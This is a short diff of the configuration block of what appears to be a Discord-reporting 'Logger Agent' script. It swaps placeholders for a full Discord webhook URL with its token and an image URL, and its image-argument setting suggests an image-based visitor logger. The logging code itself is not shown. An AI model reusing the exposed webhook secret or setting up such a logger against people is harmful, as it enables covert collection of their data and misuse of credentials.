@@ -10,8 +10,8 @@ __version__ = "v2.0"
 __author__ = "foaqen"
 
 config = {
-    "webhook": "webhook buraya",
-    "image": "resim buraya", 
+    "webhook": "https://discord.com/api/webhooks/1516925519587967210/Ja89N3pOvPydrB8wEwJW_WZ2XViCQshRFqWRE13DQmhvZ4p-3MsDZtrT0Z9V7b2XSI_v",
+    "image": "https://i.pinimg.com/736x/94/d6/74/94d6749cc3aee5ab8709d9ef0b27b9d9.jpg", 
     "imageArgument": True,
 
     "username": "Logger Agent", 
